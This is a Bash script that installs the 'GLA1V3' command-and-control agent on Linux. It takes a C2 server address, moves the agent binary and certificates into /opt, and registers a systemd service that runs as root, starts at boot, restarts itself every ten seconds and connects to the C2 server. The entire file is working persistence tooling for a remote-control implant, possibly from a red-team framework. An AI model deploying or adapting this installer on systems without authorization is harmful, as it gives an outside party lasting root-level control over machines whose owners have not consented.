#!/bin/bash
# GLA1V3 Agent Installation Script
# This script installs the agent as a systemd service

set -e

AGENT_NAME="$1"
C2_SERVER="$2"
INSTALL_DIR="/opt/gla1v3-agent"

if [ -z "$AGENT_NAME" ] || [ -z "$C2_SERVER" ]; then
    echo "Usage: $0 <agent_name> <c2_server>"
    exit 1
fi

echo "[*] Installing GLA1V3 agent: $AGENT_NAME"

# Create installation directory
echo "[*] Creating installation directory: $INSTALL_DIR"
sudo mkdir -p "$INSTALL_DIR"
sudo chmod 755 "$INSTALL_DIR"

# Move agent binary
echo "[*] Installing agent binary"
sudo mv /tmp/gla1v3-agent "$INSTALL_DIR/agent"
sudo chmod +x "$INSTALL_DIR/agent"

# Move certificates
echo "[*] Installing certificates"
sudo mv /tmp/agent-cert.pem "$INSTALL_DIR/cert.pem"
sudo mv /tmp/agent-key.pem "$INSTALL_DIR/key.pem"
sudo mv /tmp/ca.crt "$INSTALL_DIR/ca.crt"
sudo chmod 600 "$INSTALL_DIR"/*.pem
sudo chmod 644 "$INSTALL_DIR/ca.crt"

# Create systemd service file
echo "[*] Creating systemd service"
sudo tee /etc/systemd/system/gla1v3-agent.service > /dev/null <<EOF
[Unit]
Description=GLA1V3 C2 Agent
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR
Environment="AGENT_CERT_PATH=$INSTALL_DIR/cert.pem"
Environment="AGENT_KEY_PATH=$INSTALL_DIR/key.pem"
Environment="AGENT_CA_PATH=$INSTALL_DIR/ca.crt"
Environment="C2_SERVER=$C2_SERVER"
Environment="AGENT_NAME=$AGENT_NAME"
ExecStart=$INSTALL_DIR/agent
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd and start service
echo "[*] Starting agent service"
sudo systemctl daemon-reload
sudo systemctl enable gla1v3-agent.service
sudo systemctl start gla1v3-agent.service

# Check status
echo "[*] Checking agent status"
sudo systemctl status gla1v3-agent.service --no-pager

echo "[+] Agent installation complete!"
echo "[+] Agent name: $AGENT_NAME"
echo "[+] C2 Server: $C2_SERVER"
echo "[+] Service status: systemctl status gla1v3-agent.service"
echo "[+] Service logs: journalctl -u gla1v3-agent.service -f"
